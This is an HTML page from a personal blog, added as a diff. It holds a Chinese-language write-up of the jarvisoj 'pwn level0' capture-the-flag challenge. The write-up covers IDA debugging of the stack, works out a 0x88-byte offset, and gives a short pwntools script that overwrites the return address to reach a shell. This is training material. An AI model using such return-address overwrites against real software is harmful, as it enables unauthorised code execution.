@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>jarvisoj pwn level0 wp | closefrom</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://closefrom.github.io/favicon.ico?v=1615649066608">
+<link rel="stylesheet" href="https://closefrom.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="
+
+
+
+下载获得文件，以及得知连接方式 nc pwn2.jarvisoj.com 9881
+
+
+
+
+用checksec检查文件的各种属性 （防护技术）
+3.用IDA*64打开目标文件，并且打开ubuntu的 linux_serverx64以..." />
+    <meta name="keywords" content="pwn" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://closefrom.github.io">
+        <img src="https://closefrom.github.io/images/avatar.png?v=1615649066608" class="site-logo">
+        <h1 class="site-title">closefrom</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://closefrom.github.io/archives" class="site-nav">
+            文章汇总
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            文章标签分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      The deeper you explore, the more you close from the truth
+    </div>
+    <div class="site-footer">
+      <div>
+	<a href="https://www.zyglz.com"> © 资源管理站</a>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<p><span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span></p>
+	<p><span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+</div>
+Powered by <a href="https://github.com/getgridea/gridea" target="_blank">closefrom</a> | <a class="rss" href="https://closefrom.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">jarvisoj pwn level0 wp</h2>
+            <div class="post-date">2019-05-10</div>
+            
+            <div class="post-content" v-pre>
+              <ol>
+<li></li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://closefrom.github.io/post-images/1.png" alt="" loading="lazy"></figure>
+<p>下载获得文件，以及得知连接方式 nc pwn2.jarvisoj.com 9881</p>
+<ol start="2">
+<li></li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://closefrom.github.io/post-images/2.png" alt="" loading="lazy"></figure>
+<p>用checksec检查文件的各种属性 （<strong>防护技术</strong>）</p>
+<p>3.用IDA*64打开目标文件，并且打开ubuntu的 linux_serverx64以便远程IDA调试<br>
+<img src="https://closefrom.github.io/post-images/3.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/4-1024x517.png" alt="" loading="lazy"></p>
+<p>4.找到main函数入口，进入<br>
+<img src="https://closefrom.github.io/post-images/5-1024x569.png" alt="" loading="lazy"></p>
+<p>f5查看对应的c语言伪代码</p>
+<ol start="5">
+<li></li>
+</ol>
+<figure data-type="image" tabindex="3"><img src="https://closefrom.github.io/post-images/6.png" alt="" loading="lazy"></figure>
+<p>可以看到main函数中，最后return调用了一个vulnerable_function函数，继续打开对应函数的页面的同时，可以注意到函数列表中的callsystem,并且打开查看 <figure class="wp-block-image"></p>
+<figure data-type="image" tabindex="4"><img src="https://closefrom.github.io/post-images/7.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://closefrom.github.io/post-images/8.png" alt="" loading="lazy"></figure>
+<p>可以看到是用read函数读取512个字节到buf中然后那个callsystem函数，是执行系统操作，获得flag，因为是新手题所以思路应该是：在vulnerable_function中执行read操作时，将返回到main函数的RIP修改为callsystem函数的地址然后getshell</p>
+<ol start="6">
+<li></li>
+</ol>
+<figure data-type="image" tabindex="6"><img src="https://closefrom.github.io/post-images/1-9.png" alt="" loading="lazy"></figure>
+<p>在call vulnerable_function处下断，然后f9运行<br>
+<img src="https://closefrom.github.io/post-images/10-1024x430.png" alt="" loading="lazy"></p>
+<p>然后f7单步步入函数<br>
+<img src="https://closefrom.github.io/post-images/11-1024x361.png" alt="" loading="lazy"></p>
+<p>—————————-非同一次调试，但意思相通——————————–</p>
+<p>7.在进入函数前，将caller的下一条指令的IP入栈了，然后可以看到第一个指令是将main函数的栈底rbp保存，然后将改变的rsp值，作为当前函数的栈底，赋值给rbp<br>
+<img src="https://closefrom.github.io/post-images/12-1024x367.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/13-1024x373.png" alt="" loading="lazy"></p>
+<p>然后继续执行下面的五条指令，分别为：将当前的栈腾出0x80H个字节的位置，然后初始化read函数所需要的三个参数。 <figure class="wp-block-image"></p>
+<figure data-type="image" tabindex="7"><img src="https://closefrom.github.io/post-images/14.png" alt="" loading="lazy"></figure>
+<p>然后，把栈窗口往下拉，可以看到，刚刚保存的RIP，地址为00007FFCC2C3AD18，再看回read函数，要开始读入字符的位置是RSI的值即：00007FFCC2C3AC90,相减得到0x88，因为00007FFCC2C3AD18处上方存放的是main函数的栈底地址，然而，从命令中可以看出是从这里开始腾出的0x80字节空间，所以，多了8字节就是这个main函数栈底地址</p>
+<p>再看会read的参数，buf可以读入512字节的数据，而只需要读入0x88+0x8字节就可以覆盖，返回到main函数的地址，根据上面提供的思路，也就是用callsystem函数的入口地址覆盖返回地址即可getshell</p>
+<p>{扩展：</p>
+<p>c语言</p>
+<p>write用法1：</p>
+<p>ssize_t write(int fd, const void *buf, size_t nbyte);</p>
+<p>fd：<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6">文件描述符</a>；</p>
+<p>buf：指定的缓冲区，即<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，指向一段内存单元；</p>
+<p>nbyte：要写入文件指定的字节数；</p>
+<p>返回值：写入文档的字节数（成功）；-1（出错）</p>
+<p>write函数把buf中nbyte写入文件描述符handle所指的文档，成功时返回写的字节数，错误时返回-1.</p>
+<p>用法2：</p>
+<p>write（const char* str,int n)</p>
+<p>str是<a href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6">字符</a>指针或字符<a href="https://baike.baidu.com/item/%E6%95%B0%E7%BB%84">数组</a>，用来存放一个字符串。</p>
+<p>n是int型数，它用来表示输出显示字符串中字符的个数。</p>
+<p>write（”string”,strlen(“string”);表示输出<a href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B8%B8%E9%87%8F">字符串常量</a></p>
+<p>}</p>
+<p>8.下面开始下python exp</p>
+<pre class="wp-block-code"><code>from pwn import *
+callsystem = 0x0000000000400596
+#callsystem函数的入口地址
+pay = "A" * 0x88
+load = pay + p64(callsystem)
+#构建payload  p64函数：将整数值转为shellcode(16进制对应的机器码)
+link = remote("pwn2.jarvisoj.com","9881")  
+#用来建立一个远程连接，pwn2.jarvisoj.com为地址，端口为9881
+link.sendline(load)  
+#发送payload，并进行换行（末尾\n）
+link.interactive() 
+#将控制权交给用户，这样就可以使用打开的shell了</code></pre><figure class="wp-block-image">
+<figure data-type="image" tabindex="8"><img src="https://closefrom.github.io/post-images/15.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://closefrom.github.io/tag/mQz58myZ-/" class="tag">
+                    pwn
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://closefrom.github.io/post/p1540-机器翻译/">
+                  <h3 class="post-title">
+                    P1540 机器翻译
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
